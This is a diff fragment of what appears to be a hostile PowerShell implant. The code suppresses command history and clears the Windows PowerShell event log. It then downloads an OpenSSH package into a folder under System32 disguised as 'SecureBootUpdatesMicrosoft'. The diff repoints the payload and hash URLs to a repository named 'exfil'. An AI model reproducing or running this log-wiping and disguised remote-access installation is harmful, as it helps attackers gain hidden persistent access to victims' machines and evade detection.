@@ -24,11 +24,11 @@ Set-PSReadLineOption -HistorySaveStyle SaveNothing | Out-Null
 Clear-EventLog "Windows Powershell"
 $LogEngineLifecycleEvent = $false | Out-Null
 [void]$LogEngineLifecycleEvent
-$downloadUrl = "https://codeberg.org/sempiampi/mavericks/releases/download/v1.0.0/OpenSSHZip.zip"
+$downloadUrl = "https://github.com/sempiampi/exfil/releases/download/1.0.0/OpenSSHZip.zip"
 #$downloadedFileName = [System.IO.Path]::GetFileName($downloadUrl)
 $programNameWithExtension = [System.IO.Path]::GetFileName($downloadUrl)
 $destinationPath = "C:\Windows\System32\SecureBootUpdatesMicrosoft\$programNameWithExtension"
-$hashesUrl = "https://codeberg.org/sempiampi/mavericks/raw/branch/main/GlobalFiles/HashesOfCorePrograms.txt"
+$hashesUrl = "https://raw.githubusercontent.com/sempiampi/exfil/refs/heads/main/GlobalFiles/HashesOfCorePrograms.txt"
 function Write-VerboseMessage($message) {
     if ($VerboseOutput) {
         Write-Host $message
